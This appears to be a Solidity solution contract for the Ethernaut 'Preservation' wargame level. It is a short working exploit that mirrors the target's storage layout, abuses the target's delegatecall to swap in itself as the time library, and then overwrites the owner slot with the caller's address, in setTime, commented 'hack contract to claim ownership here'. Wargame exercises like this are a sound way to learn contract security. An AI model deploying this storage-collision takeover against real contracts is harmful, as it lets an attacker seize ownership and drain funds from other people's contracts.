// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PreservationContract {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    PreservationContract preservationContract;

    constructor(address presAddress) {
        preservationContract = PreservationContract(presAddress);
    }

    function setTime(uint256 _time) external {
        // hack contract to claim ownership here
        owner = msg.sender;
    }

    function setThisContractAsTimeLibrary() external {
        preservationContract.setFirstTime(uint160(address(this)));
    }
}